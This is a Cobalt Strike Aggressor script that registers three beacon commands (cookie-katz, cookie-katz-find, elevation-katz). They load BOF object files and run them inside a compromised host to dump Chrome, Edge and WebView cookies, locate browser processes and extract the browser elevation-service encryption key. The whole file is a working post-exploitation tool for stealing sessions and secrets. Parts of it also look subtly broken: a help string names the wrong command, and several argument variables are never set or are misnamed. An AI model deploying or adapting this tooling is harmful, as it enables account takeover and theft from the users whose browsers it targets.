debug(5);

beacon_command_register(
   "cookie-katz",
   "Dump cookies from Chrome or Edge",
   "Dump cookies from Chrome or Edge\n\nUse: cookie-katz [chrome|edge|webview] [pid]"
);

beacon_command_register(
   "cookie-katz-find",
   "Find processes for cookie-katz",
   "Find processes for cookie-katz\n\nUse: cookie-katz-find [chrome|edge|webview]"
);

beacon_command_register(
   "elevation-katz",
   "Dump elevation service encryption key",
   "Dump elevation service encryption key\n\nUse: cookie-katz [chrome|edge] [terminate] [useHW] [useTL32] [wait] [executable_path] [module_name]"
);


alias cookie-katz {
    local('$bid $browser $pid $pidStr $handle $data $args $path');
    if (size(@_) != 3) {
        berror($1, "Use: [chrome|edge|webview] [pid]");
        return;
    }
    else if (barch($1) eq "x86") {
        berror($1, "Not a x64 beacon!");
        return;
    }

    # Check arguments
    ($bid, $browser, $pidStr) = @_;
    if ($browser !in @("chrome", "edge", "webview")) {
        berror($1, "Unsupported browser: '$browser $+ '");
        return;
    }

    $pid = [Integer parseInt: $pidStr];
    if ($pid is $null) {
        berror($1, "Could not parse pid '$pidStr $+ '");
        return;
    }

    # Read the BOF
    $path = getFileProper(script_resource(""), "release", "CookieKatzBOF.x64.o");
    if (!-isFile $path) {
        berror($1, "$path does not exist");
        return;
    }
    $handle = openf($path);
    $data = readb($handle, -1);
    closef($handle);

    # Pack our arguments
    $args   = bof_pack($1, "zi", "/$browser", $pid);

    # Execute it
    beacon_inline_execute($1, $data, "go", $args);
}

alias cookie-katz-find {
    local('$bid $browser $handle $data $args $path');
    if (size(@_) != 2) {
        berror($1, "Use: [chrome|edge|webview]");
        return;
    }
    else if (barch($1) eq "x86") {
        berror($1, "Not a x64 beacon!");
        return;
    }

    # Check arguments
    ($bid, $browser) = @_;
    if ($browser !in @("chrome", "edge", "webview")) {
        berror($1, "Unsupported browser: '$browser $+ '");
        return;
    }

    # Read the BOF
    $path = getFileProper(script_resource(""), "release", "ListChromeProcessCookies.x64.o");
    if (!-isFile $path) {
        berror($1, "$path does not exist");
        return;
    }
    $handle = openf($path);
    $data = readb($handle, -1);
    closef($handle);

    # Pack our arguments
    $args   = bof_pack($1, "z", "/$browser");

    # Execute it
    beacon_inline_execute($1, $data, "go", $args);
}

alias elevation-katz {
    local('$bid $browser $terminate $terminateStr $useHW $useHWStr $useTL32 $useTL32Str $wait $waitStr $executable $module $handle $data $args $path');
    if (size(@_) != 8) {
        berror($1, "Use: [chrome|edge] [terminate] [useHW] [useTL32] [wait] [executable_path] [module_name]");
        return;
    }
    else if (barch($1) eq "x86") {
        berror($1, "Not a x64 beacon!");
        return;
    }

    # Either browser must be in acceptable values or
    # You must provide both executable path AND module name
    ($bid, $browser) = @_;
    if ($browser !in @("chrome", "edge")) && ($executable is $null || $module is $null) {
        berror($1, "Unsupported browser: '$browser $+ '");
        return;
    }

    # Setting default values for flags
    $terminate = [Integer parseInt: $terminateStr];
    if ($terminate is $null) {
        $terminate = 0;
    } else {
        $terminate = 1;
    }

    $useHW = [Integer parseInt: $useHWStr];
    if ($useHW is $null) {
        $useHW = 0;
    } else {
        $useHW = 1;
    }

    $useTL32 = [Integer parseInt: $useTL32Str];
    if ($useTL32 is $null) {
        $useTL32 = 0;
    } else {
        $useTL32 = 1;
    }

    # in BOF the 0 is not accepteable. In executable it will map for INFINITY
    # But we don't want to lose our beacon due to that. BOF has also checks for 0, but just in case...
    $wait = [Integer parseInt: $waitStr];
    if ($wait is $null || $wait == 0) {
        $wait = 500;
    } else {
        $wait = $waitStr;
    }

    if ($executable is $null) {
        $executable = "";
    }

    if ($module_name is $null) {
        $module_name = "";
    }

    # Read the BOF
    $path = getFileProper(script_resource(""), "release", "ElevationKatzBOF.x64.o");
    if (!-isFile $path) {
        berror($1, "$path does not exist");
        return;
    }
    $handle = openf($path);
    $data = readb($handle, -1);
    closef($handle);

    # Pack our arguments
    # browser, teminate, useHW, useTL32, wait, executable, module
    # const char*, short, short, short, int, const wchar_t*, const wchar_t*
    $args   = bof_pack($1, "zsssiZZ", "/$browser", $terminate, $useHW, $useTL32, $wait, "/$executable", "/$module");

    # Execute it
    beacon_inline_execute($1, $data, "go", $args);
}
